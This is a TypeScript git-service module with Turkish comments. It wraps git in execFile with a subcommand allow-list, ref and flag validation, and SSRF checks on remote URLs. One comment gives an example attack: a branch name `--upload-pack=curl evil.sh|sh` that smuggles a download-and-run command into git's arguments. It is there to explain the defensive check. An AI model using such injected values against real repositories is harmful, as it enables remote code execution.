/**
 * P03 / Y-P03-004 — Git servisi (ADR-006).
 *
 * P00 Truth Audit: repo'da **hiç Git entegrasyonu yoktu**.
 *   - `child_process`, `simple-git`, `isomorphic-git`, `nodegit`: hiçbiri yok.
 *   - `ReadOnlyGitHubRepoAdapter` her metotta `ok:false` dönüyordu.
 *   - `getChangedFiles()` `E_UNSUPPORTED` dönüyordu.
 *   - `getDiff()` Git'e hiç bakmadan iki string'i satır satır karşılaştırıyordu.
 *
 * Yani "AI coding agent context plane" iddiasındaki ürün repository'ye
 * bağlanamıyordu — golden path'in ilk kopuk halkası buydu.
 *
 * GÜVENLİK (T-22 command injection):
 *   - `execFile` kullanılır, `exec` DEĞİL. Shell hiç devreye girmez.
 *   - Argümanlar dizi olarak geçer; string birleştirme yok.
 *   - Kullanıcı girdisi asla flag pozisyonuna gelemez (`--` ayracı + doğrulama).
 *   - Yalnız allow-list'teki alt komutlar çalıştırılır.
 */

import { execFile } from "child_process";
import { promisify } from "util";

const execFileAsync = promisify(execFile);

/** Çalıştırılmasına izin verilen git alt komutları. */
export const ALLOWED_SUBCOMMANDS = [
  "rev-parse",
  "log",
  "diff",
  "diff-tree",
  "status",
  "ls-files",
  "cat-file",
  "clone",
  "fetch",
  "checkout",
  "symbolic-ref",
  "config",
  "init",
  "add",
  "commit",
  "remote"
] as const;

export type GitSubcommand = (typeof ALLOWED_SUBCOMMANDS)[number];

export class GitCommandError extends Error {
  constructor(
    message: string,
    readonly subcommand: string,
    readonly exitCode: number | null,
    readonly stderr: string
  ) {
    super(message);
    this.name = "GitCommandError";
  }
}

export class GitSecurityError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "GitSecurityError";
  }
}

export interface GitRunOptions {
  readonly cwd: string;
  readonly timeoutMs?: number;
  readonly maxBufferBytes?: number;
  /** Ek ortam değişkenleri. Kimlik bilgisi ASLA argümana konmaz. */
  readonly env?: NodeJS.ProcessEnv;
}

const DEFAULT_TIMEOUT_MS = 60_000;
const DEFAULT_MAX_BUFFER = 32 * 1024 * 1024;

/**
 * Bir argümanın flag olarak yorumlanabilecek bir kullanıcı girdisi
 * olmadığını doğrular.
 *
 * Örnek saldırı: dal adı olarak `--upload-pack=curl evil.sh|sh` geçirmek.
 * `execFile` shell açmadığı için komut enjeksiyonu olmaz, ama git'in KENDİ
 * flag'leri hâlâ tehlikelidir.
 */
export function assertNotFlag(value: string, label: string): void {
  if (value.startsWith("-")) {
    throw new GitSecurityError(
      `${label} '-' ile baslayamaz (flag enjeksiyonu): ${JSON.stringify(value)}`
    );
  }
  if (value.includes("\0")) {
    throw new GitSecurityError(`${label} NUL bayti icermemeli.`);
  }
}

/** Git ref adı doğrulaması (dal, tag, SHA). */
const REF_RE = /^[A-Za-z0-9._\/-]{1,255}$/;

export function assertValidRef(ref: string, label = "ref"): void {
  assertNotFlag(ref, label);
  if (!REF_RE.test(ref)) {
    throw new GitSecurityError(`Gecersiz ${label}: ${JSON.stringify(ref)}`);
  }
  if (ref.includes("..") || ref.endsWith(".lock") || ref.startsWith("/")) {
    throw new GitSecurityError(`Gecersiz ${label}: ${JSON.stringify(ref)}`);
  }
}

/** Uzak repo URL'i doğrulaması (T-23 SSRF'in git ayağı). */
export function assertSafeRemoteUrl(url: string, allowedHosts?: readonly string[]): URL {
  assertNotFlag(url, "remote url");

  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    throw new GitSecurityError(`Gecersiz remote URL: ${JSON.stringify(url)}`);
  }

  if (parsed.protocol !== "https:") {
    // git:// ve ssh:// bilerek disarida: kimlik dogrulamasi ve sertifika
    // dogrulamasi https uzerinden yonetilir.
    throw new GitSecurityError(`Yalniz https remote destekleniyor: ${parsed.protocol}`);
  }

  // Kimlik bilgisi URL'de tasinmaz; credential helper / header kullanilir.
  if (parsed.username || parsed.password) {
    throw new GitSecurityError("Remote URL kimlik bilgisi tasiyamaz.");
  }

  if (isPrivateHost(parsed.hostname)) {
    throw new GitSecurityError(`Ic ag adresine clone yapilamaz: ${parsed.hostname}`);
  }

  if (allowedHosts && allowedHosts.length > 0 && !allowedHosts.includes(parsed.host)) {
    throw new GitSecurityError(
      `Remote host allow-list disinda: ${parsed.host}. Izin verilenler: ${allowedHosts.join(", ")}`
    );
  }

  return parsed;
}

/** RFC1918 / loopback / link-local / metadata adresleri. */
export function isPrivateHost(hostname: string): boolean {
  const h = hostname.toLowerCase();
  if (h === "localhost" || h.endsWith(".localhost") || h.endsWith(".local") || h.endsWith(".internal")) {
    return true;
  }
  // IPv6 loopback / unique-local
  if (h === "::1" || h.startsWith("fc") || h.startsWith("fd") || h.startsWith("fe80:")) return true;

  const v4 = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(h);
  if (!v4) return false;

  const [a, b] = [Number(v4[1]), Number(v4[2])];
  if (a === 10) return true;
  if (a === 127) return true;
  if (a === 0) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  if (a === 169 && b === 254) return true; // link-local + cloud metadata (169.254.169.254)
  return false;
}

/**
 * Bir git alt komutunu çalıştırır.
 *
 * `args` dizisi doğrudan `execFile`'a verilir — shell yorumlaması YOKTUR.
 */
export async function runGit(
  subcommand: GitSubcommand,
  args: readonly string[],
  options: GitRunOptions
): Promise<{ stdout: string; stderr: string }> {
  if (!ALLOWED_SUBCOMMANDS.includes(subcommand)) {
    throw new GitSecurityError(`Izin verilmeyen git alt komutu: ${subcommand}`);
  }

  for (const arg of args) {
    if (typeof arg !== "string") {
      throw new GitSecurityError("Git argumanlari string olmali.");
    }
    if (arg.includes("\0")) {
      throw new GitSecurityError("Git argumani NUL bayti icermemeli.");
    }
  }

  try {
    const { stdout, stderr } = await execFileAsync("git", [subcommand, ...args], {
      cwd: options.cwd,
      timeout: options.timeoutMs ?? DEFAULT_TIMEOUT_MS,
      maxBuffer: options.maxBufferBytes ?? DEFAULT_MAX_BUFFER,
      windowsHide: true,
      env: {
        ...process.env,
        ...options.env,
        // Kimlik bilgisi istemi asla acilmasin; aksi halde surec asili kalir.
        GIT_TERMINAL_PROMPT: "0",
        GIT_ASKPASS: "echo",
        // Kullanicinin global git config'i sonuclari degistirmesin.
        GIT_CONFIG_NOSYSTEM: "1"
      }
    });
    return { stdout, stderr };
  } catch (error) {
    const err = error as NodeJS.ErrnoException & { stdout?: string; stderr?: string; code?: number };
    throw new GitCommandError(
      `git ${subcommand} basarisiz: ${err.message}`,
      subcommand,
      typeof err.code === "number" ? err.code : null,
      err.stderr ?? ""
    );
  }
}
